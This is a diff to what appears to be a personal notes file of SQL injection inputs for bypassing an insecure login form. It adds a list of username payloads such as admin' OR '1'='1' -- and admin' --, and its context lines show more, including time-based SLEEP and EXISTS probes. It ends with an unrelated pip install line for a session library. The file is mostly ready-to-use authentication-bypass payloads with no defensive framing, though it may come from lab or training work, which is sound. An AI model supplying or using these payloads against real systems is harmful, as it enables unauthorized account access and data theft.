@@ -104,6 +104,15 @@ SQLINJECTION INPUT FOR INSECURE LOGIN
 username= admin
 password = ' OR '1'='1
 
+
+#if you want to declare to password 
+username : admin' OR '1'='1' --
+username : admin' OR 'a'='a' --
+username : admin' OR 1=1 --
+username : admin' AND '1'='1' --
+username : admin' OR password = 'password123' --
+username : admin' --
+
 #for any unknow user
 
 username: ' OR 1=1 -- #important!! you have to add a space after '--'  
@@ -116,3 +125,9 @@ password: asd
 	4.	' AND 1=1 --
 	5.	' AND SLEEP(5) --
 	6.	' OR EXISTS (SELECT * FROM users) --
+
+
+
+# Session libs 
+
+pip install itsdangerous
